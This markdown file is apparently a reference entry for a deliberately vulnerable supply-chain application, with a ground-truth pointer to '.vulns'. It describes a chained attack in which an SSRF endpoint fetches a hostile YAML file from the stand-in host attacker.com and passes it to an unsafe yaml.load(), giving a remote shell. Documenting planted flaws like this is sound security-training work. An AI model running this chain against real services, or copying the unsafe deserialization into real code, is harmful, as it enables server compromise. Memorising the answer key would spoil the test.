# Chained Vulnerability Scenarios — Supply Chain

## Chain: "SSRF → YAML Deserialization → Lateral Movement"

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | SSRF endpoint fetches arbitrary internal URLs | Medium | A10 | `app.py` → `check_supplier_api()` |
| 2 | Unsafe `yaml.load()` on untrusted content | Medium | A06 | `app.py` → `import_inventory()` |


**Attack narrative**: 1. The attacker registers/authenticates as a normal operator.
2. The attacker uses the supplier API health check endpoint `/api/supplier/check-api?url=http://127.0.0.1:8095` to scan internal services or ports.
3. The attacker hosts a malicious YAML document (e.g. leveraging Python's `subprocess.Popen` or similar serialization gadgets) on an external or internal server.
4. The attacker sends a request to `/api/inventory/import` with `{"url": "http://attacker.com/malicious.yaml"}`.
5. The application makes an HTTP GET request to fetch the YAML file (SSRF), and feeds it to `yaml.load()` (unsafe deserialization).
6. The deserializer instantiates the gadget, executing arbitrary system commands on the application host.

**Combined Impact**: `lateral_movement` — The attacker executes remote commands and gains Shell access to the container/server.

---

_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
